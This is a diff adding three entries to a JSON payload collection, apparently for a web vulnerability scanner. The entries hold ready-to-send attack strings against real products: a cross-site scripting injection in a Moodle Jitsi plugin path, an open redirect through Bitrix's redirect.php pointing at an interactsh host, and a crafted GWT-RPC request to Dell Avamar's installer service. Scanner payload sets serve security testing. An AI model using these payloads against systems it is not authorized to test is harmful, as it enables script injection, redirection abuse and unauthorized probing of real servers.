@@ -28609,5 +28609,38 @@
       "expected_status_code": 200,
       "success_regex": "version|vulnerable"
     }
+  },
+  {
+    "payload_id": "OWP-474636",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/mod/jitsi/sessionpriv.php?avatar=https%3A%2F%2Fexample.com%2Fuser%2Fpix.php%2F498%2Ff1.jpg&nom=test_user%27)%3balert(document.domain)%3b//&ses=test_user&t=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474637",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/bitrix/redirect.php?goto=https://example.com%252F:123@interactsh.com/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474638",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/avi/avigui/|60AF6BC6976F9B1F05AC454813F5324D|com.avamar.avinstaller.gwt.shared.AvinstallerService|getLDLSConfig|java.lang.String/2004016611|example.com|1|2|3|4|2|5|5|6|0|",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
   }
 ]
